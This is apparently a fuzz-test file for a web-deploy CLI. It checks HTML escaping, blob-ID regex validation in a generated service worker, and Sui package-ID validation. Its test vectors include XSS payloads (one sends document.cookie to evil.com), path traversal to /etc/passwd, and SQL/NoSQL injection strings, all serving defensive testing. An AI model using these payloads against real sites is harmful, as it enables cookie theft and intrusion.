import { describe, test } from 'node:test'
import assert from 'node:assert/strict'
import { generate_bootstrap } from '../../src/lib/generate.js'

/**
 * Fuzz tests for input validation in versui-cli
 * Tests blob_id validation (XSS vectors) and package ID validation
 */

describe('blob_id XSS/injection fuzz tests', () => {
  const aggregators = ['https://aggregator.walrus-testnet.walrus.space']

  /**
   * XSS vectors - these should be sanitized in HTML context
   * and rejected by blob_id validation regex in service worker
   */
  const xss_vectors = [
    // Basic script injection
    '<script>alert(1)</script>',
    '<SCRIPT>alert(1)</SCRIPT>',
    '<script src="evil.js"></script>',
    '<script>fetch("evil.com?c="+document.cookie)</script>',

    // Protocol handlers
    'javascript:alert(1)',
    'javascript:void(0)',
    'data:text/html,<script>alert(1)</script>',
    'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',

    // HTML entities and encoding
    '&#60;script&#62;alert(1)&#60;/script&#62;',
    '&lt;script&gt;alert(1)&lt;/script&gt;',
    '%3Cscript%3Ealert(1)%3C/script%3E',
    'x%00script',

    // Event handlers
    '" onclick="alert(1)',
    "' onerror='alert(1)",
    'x" autofocus onfocus="alert(1)',
    'x onerror=alert(1)',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '<body onload=alert(1)>',

    // SVG payloads
    '<svg><script>alert(1)</script></svg>',
    '<svg/onload=alert(1)>',

    // Unicode and encoding tricks
    '\u003cscript\u003ealert(1)\u003c/script\u003e',
    '\\u003cscript\\u003e',
    '\x3cscript\x3e',

    // Path traversal attempts
    '../../../etc/passwd',
    '..\\..\\..\\windows\\system32',
    '....//....//....//etc/passwd',
    '%2e%2e%2f%2e%2e%2f',

    // SQL/NoSQL injection patterns
    "'; DROP TABLE sites; --",
    '1\' OR \'1\'=\'1',
    '{ "$gt": "" }',
    '{ "$ne": null }',
    '{"$where": "sleep(1000)"}',

    // Null bytes
    'valid\x00malicious',
    'blob\0id',

    // Control characters
    'blob\rid',
    'blob\nid',
    'blob\tid',
    '\r\n\t',

    // Unicode confusables
    'ｂｌｏｂ_ｉｄ', // Full-width characters
    'blob\u200bid', // Zero-width space
    'blob\uFEFFid', // Zero-width no-break space

    // Very long strings (DoS attempt)
    'a'.repeat(10000),
    '<script>' + 'a'.repeat(100000) + '</script>',

    // Empty and whitespace
    '',
    ' ',
    '   ',
    '\n\r\t',

    // Special characters
    '!@#$%^&*()',
    '~`|\\{}[]',
    '??><',
    '\'"',
  ]

  xss_vectors.forEach((malicious_input) => {
    const display_input =
      malicious_input.length > 50
        ? `${malicious_input.slice(0, 50)}... (${malicious_input.length} chars)`
        : malicious_input
    const safe_label = display_input.replace(/\n/g, '\\n').replace(/\r/g, '\\r')

    test(`site_name XSS protection: ${safe_label}`, () => {
      const resource_map = { '/index.html': 'valid_blob_id' }
      const { html } = generate_bootstrap(
        malicious_input,
        aggregators,
        resource_map,
      )

      // Verify HTML escaping for the dangerous characters: < > & "
      const escaped_html = malicious_input
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')

      // The escaped version should be in the title
      assert.ok(
        html.includes(`<title>${escaped_html}</title>`),
        `Site name should be HTML-escaped. Expected: ${escaped_html}`,
      )

      // Verify no unescaped dangerous characters
      if (malicious_input.includes('<')) {
        assert.ok(
          !html.includes(`<title>${malicious_input}`),
          'Unescaped < should not appear in title',
        )
      }
    })

    test(`blob_id service worker validation: ${safe_label}`, () => {
      const resource_map = { '/index.html': malicious_input }
      const { sw } = generate_bootstrap('test', aggregators, resource_map)

      // Verify service worker has the validation regex
      assert.ok(
        sw.includes('/^[a-zA-Z0-9_-]+$/'),
        'Service worker should contain blob_id validation regex',
      )

      // Verify the regex would reject this malicious input
      const blob_id_regex = /^[a-zA-Z0-9_-]+$/
      const is_valid = blob_id_regex.test(malicious_input)

      // All inputs (valid or not) - confirm the SW has protection code
      assert.ok(
        sw.includes("if(!/^[a-zA-Z0-9_-]+$/.test(b))return e.respondWith(new Response('invalid',{status:400}))"),
        'Service worker should have runtime validation that returns 400 for invalid blob_id',
      )

      // Verify resource map is JSON-stringified (no raw code injection possible)
      assert.ok(
        sw.match(/const A=.+,R=/),
        'Resource map should be serialized in service worker',
      )

      // IMPORTANT: JSON.stringify does NOT escape <script> tags or most XSS vectors
      // They are valid JSON strings! The safety comes from the RUNTIME regex validation
      // that prevents invalid blob_ids from ever being fetched, NOT from escaping.
      // This means malicious blob_ids CAN appear in the resource map JSON,
      // but the service worker will return 400 when trying to use them.
    })
  })

  test('valid blob_id passes service worker validation', () => {
    const valid_blob_ids = [
      'abc123',
      'ABC123',
      'blob_id_with_underscores',
      'blob-id-with-hyphens',
      'aB1-_2Cd',
      'a',
      '1',
      '_',
      '-',
    ]

    valid_blob_ids.forEach((blob_id) => {
      const resource_map = { '/index.html': blob_id }
      const { sw } = generate_bootstrap('test', aggregators, resource_map)

      const blob_id_regex = /^[a-zA-Z0-9_-]+$/
      assert.ok(blob_id_regex.test(blob_id), `${blob_id} should be valid`)
      assert.ok(sw.includes(blob_id), `Valid blob_id ${blob_id} should be in SW`)
    })
  })
})

describe('package_id validation fuzz tests', () => {
  /**
   * Tests package ID validation regex locally
   * Mirrors the validation logic from env.js: /^0x[a-fA-F0-9]{64}$/
   */
  const is_valid_package_id = (id) => {
    if (!id || typeof id !== 'string') return false
    return /^0x[a-fA-F0-9]{64}$/.test(id)
  }

  const package_id_validation_vectors = [
    // Invalid: not a string
    { input: null, valid: false, label: 'null' },
    { input: undefined, valid: false, label: 'undefined' },
    { input: 123, valid: false, label: 'number' },
    { input: {}, valid: false, label: 'object' },
    { input: [], valid: false, label: 'array' },

    // Invalid: wrong format
    { input: '', valid: false, label: 'empty string' },
    { input: ' ', valid: false, label: 'whitespace' },
    {
      input: '0x',
      valid: false,
      label: 'missing hex digits',
    },
    {
      input: '0xabc',
      valid: false,
      label: 'too short',
    },
    {
      input: '0x' + 'a'.repeat(63),
      valid: false,
      label: '63 hex chars (too short)',
    },
    {
      input: '0x' + 'a'.repeat(65),
      valid: false,
      label: '65 hex chars (too long)',
    },
    {
      input: 'a'.repeat(66),
      valid: false,
      label: 'no 0x prefix',
    },

    // Invalid: non-hex characters
    {
      input: '0x' + 'g'.repeat(64),
      valid: false,
      label: 'invalid hex (g)',
    },
    {
      input: '0x' + 'z'.repeat(64),
      valid: false,
      label: 'invalid hex (z)',
    },
    {
      input: '0x' + '@'.repeat(64),
      valid: false,
      label: 'special chars',
    },
    {
      input:
        '0x' +
        'a'.repeat(32) +
        '<script>alert(1)</script>' +
        'a'.repeat(7),
      valid: false,
      label: 'XSS in package ID',
    },

    // SQL/NoSQL injection
    {
      input: "0x' OR '1'='1",
      valid: false,
      label: 'SQL injection',
    },
    {
      input: '0x{ "$gt": "" }',
      valid: false,
      label: 'NoSQL injection',
    },

    // Path traversal
    {
      input: '0x../../etc/passwd',
      valid: false,
      label: 'path traversal',
    },

    // Unicode and encoding
    {
      input: '0x' + '\u0061'.repeat(64),
      valid: true,
      label: 'unicode hex (valid)',
    },
    {
      input: '0x' + '\u3000'.repeat(64),
      valid: false,
      label: 'unicode ideographic space',
    },

    // Control characters
    {
      input: '0x' + 'a'.repeat(32) + '\n' + 'a'.repeat(31),
      valid: false,
      label: 'newline in middle',
    },
    {
      input: '0x' + 'a'.repeat(32) + '\x00' + 'a'.repeat(31),
      valid: false,
      label: 'null byte',
    },

    // Case sensitivity (should be valid)
    {
      input: '0x' + 'A'.repeat(64),
      valid: true,
      label: 'uppercase hex',
    },
    {
      input: '0x' + 'a'.repeat(64),
      valid: true,
      label: 'lowercase hex',
    },
    {
      input: '0x' + 'Aa'.repeat(32),
      valid: true,
      label: 'mixed case hex',
    },

    // Valid Sui package IDs
    {
      input:
        '0x2489609d5e6b754634d4ca892ab259222482f31596a13530fcc8110b5b2461cb',
      valid: true,
      label: 'valid testnet package ID',
    },
    {
      input:
        '0x824052b308a7edad4ef16eef0f4f724786577f7fef68b6dddeeba8006ead9eb8',
      valid: true,
      label: 'valid original package ID',
    },
    {
      input: '0x' + '0'.repeat(64),
      valid: true,
      label: 'all zeros',
    },
    {
      input: '0x' + 'f'.repeat(64),
      valid: true,
      label: 'all fs',
    },
    {
      input: '0x' + '0123456789abcdef'.repeat(4),
      valid: true,
      label: 'all hex digits',
    },
  ]

  package_id_validation_vectors.forEach(({ input, valid, label }) => {
    test(`package_id validation: ${label}`, () => {
      const result = is_valid_package_id(input)
      assert.strictEqual(
        result,
        valid,
        `Expected ${label} to be ${valid ? 'valid' : 'invalid'}, got ${result}`,
      )
    })
  })
})

describe('get_validated_package_id edge cases', () => {
  /**
   * Mirrors the get_validated_package_id logic from env.js
   */
  const is_valid_package_id = (id) => {
    if (!id || typeof id !== 'string') return false
    return /^0x[a-fA-F0-9]{64}$/.test(id)
  }

  const get_validated_package_id = (env_var, default_value) => {
    if (env_var && is_valid_package_id(env_var)) {
      return env_var
    }
    return default_value
  }

  test('returns default when env_var is invalid', () => {
    const default_id =
      '0x2489609d5e6b754634d4ca892ab259222482f31596a13530fcc8110b5b2461cb'

    // Invalid env vars should fall back to default
    assert.strictEqual(
      get_validated_package_id('invalid', default_id),
      default_id,
    )
    assert.strictEqual(get_validated_package_id('', default_id), default_id)
    assert.strictEqual(get_validated_package_id(null, default_id), default_id)
    assert.strictEqual(
      get_validated_package_id(undefined, default_id),
      default_id,
    )
  })

  test('returns env_var when valid, ignoring default', () => {
    const valid_env =
      '0x824052b308a7edad4ef16eef0f4f724786577f7fef68b6dddeeba8006ead9eb8'
    const default_id =
      '0x2489609d5e6b754634d4ca892ab259222482f31596a13530fcc8110b5b2461cb'

    assert.strictEqual(get_validated_package_id(valid_env, default_id), valid_env)
  })

  test('returns null default when env_var is invalid', () => {
    assert.strictEqual(get_validated_package_id('malicious', null), null)
    assert.strictEqual(
      get_validated_package_id('<script>alert(1)</script>', null),
      null,
    )
  })

  test('XSS/injection attempts always return default', () => {
    const default_id =
      '0x2489609d5e6b754634d4ca892ab259222482f31596a13530fcc8110b5b2461cb'
    const malicious_inputs = [
      '<script>alert(1)</script>',
      "'; DROP TABLE sites; --",
      '{ "$gt": "" }',
      '../../../etc/passwd',
      'javascript:alert(1)',
    ]

    malicious_inputs.forEach((input) => {
      assert.strictEqual(
        get_validated_package_id(input, default_id),
        default_id,
        `Malicious input "${input}" should fall back to default`,
      )
    })
  })
})

describe('resource_map JSON serialization safety', () => {
  test('malicious keys and values are safely JSON-stringified', () => {
    const aggregators = ['https://aggregator.walrus-testnet.walrus.space']

    const malicious_resource_map = {
      '/index.html': 'valid_blob',
      '/<script>alert(1)</script>': 'blob1',
      '/"; alert(1); "': 'blob2',
      '/\x00null\x00byte': 'blob3',
    }

    const { sw } = generate_bootstrap(
      'test',
      aggregators,
      malicious_resource_map,
    )

    // Verify resource map is JSON-stringified
    assert.ok(sw.match(/const A=.+,R=/), 'Resource map should be in service worker')

    // JSON.stringify will serialize the object safely
    // Even if malicious keys exist, they'll be quoted strings in the object
    const resource_json = JSON.stringify(malicious_resource_map)
    assert.ok(
      sw.includes(resource_json),
      'Resource map should be safely JSON-stringified',
    )
  })

  test('aggregators array is safely serialized', () => {
    const malicious_aggregators = [
      'https://valid.com',
      '<script>alert(1)</script>',
      'javascript:void(0)',
    ]

    const { sw } = generate_bootstrap('test', malicious_aggregators, {
      '/index.html': 'blob',
    })

    // Verify aggregators array is JSON-stringified
    assert.ok(sw.match(/const A\s*=\s*\[/), 'Aggregators should be JSON array')

    // JSON.stringify will escape the script tags
    const agg_json = JSON.stringify(malicious_aggregators)
    assert.ok(
      sw.includes(agg_json),
      'Aggregators should be safely JSON-stringified',
    )
  })

  test('malicious blob_id values are caught by runtime validation', () => {
    const aggregators = ['https://aggregator.walrus-testnet.walrus.space']
    const malicious_resource_map = {
      '/index.html': '<script>alert(1)</script>',
      '/styles.css': 'javascript:void(0)',
      '/app.js': '../../../etc/passwd',
    }

    const { sw } = generate_bootstrap('test', aggregators, malicious_resource_map)

    // The malicious blob_ids will be in the resource map JSON
    // BUT the runtime validation regex will block them from being fetched
    assert.ok(
      sw.includes("if(!/^[a-zA-Z0-9_-]+$/.test(b))return e.respondWith(new Response('invalid',{status:400}))"),
      'Runtime validation should catch invalid blob_ids',
    )

    // Verify malicious blob_ids fail the regex check
    const blob_id_regex = /^[a-zA-Z0-9_-]+$/
    assert.ok(!blob_id_regex.test('<script>alert(1)</script>'), 'Script should fail validation')
    assert.ok(!blob_id_regex.test('javascript:void(0)'), 'JavaScript protocol should fail')
    assert.ok(!blob_id_regex.test('../../../etc/passwd'), 'Path traversal should fail')
  })
})
